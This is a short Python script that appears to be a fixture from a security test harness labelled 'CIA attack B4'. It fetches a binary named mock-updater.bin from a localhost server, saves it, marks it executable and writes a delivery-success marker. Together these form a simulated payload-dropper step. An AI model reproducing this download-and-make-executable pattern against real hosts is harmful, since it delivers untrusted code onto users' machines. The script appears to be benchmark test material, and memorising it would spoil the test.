#!/usr/bin/env python3
from __future__ import annotations

import base64
import json
import os
import stat
import urllib.parse
import urllib.request
from pathlib import Path

TRACEID = 104
ROOT = Path(".cia_attack")
ROOT.mkdir(exist_ok=True)
MARKER = Path(".cia_attack/cia_b4_delivery_success_104.txt")
ANCHOR = Path(".cia_attack/anchor_b4_104.txt")
LEGACY = Path(".cia_attack/cia_b4_delivery_success_104.txt")
ANCHOR.parent.mkdir(parents=True, exist_ok=True)
ANCHOR.write_text("DAEDALUS_CIA_ANCHOR_B4_104\n", encoding="utf-8")


def write_marker(content: str) -> None:
    MARKER.parent.mkdir(parents=True, exist_ok=True)
    MARKER.write_text(content, encoding="utf-8")


def post_fixture(url: str, payload: dict) -> None:
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(url, data=data, headers={"content-type": "application/json"}, method="POST")
    try:
        urllib.request.urlopen(request, timeout=3).read()
    except Exception:
        pass

binary = urllib.request.urlopen("http://127.0.0.1:8799/fixtures/mock-updater.bin", timeout=5).read()
out = ROOT / "mock-updater-104.bin"
out.write_bytes(binary)
out.chmod(0o755)
write_marker("B4 controlled delivery marker\n" + str(out))
print("CIA B4 fixture delivery complete")
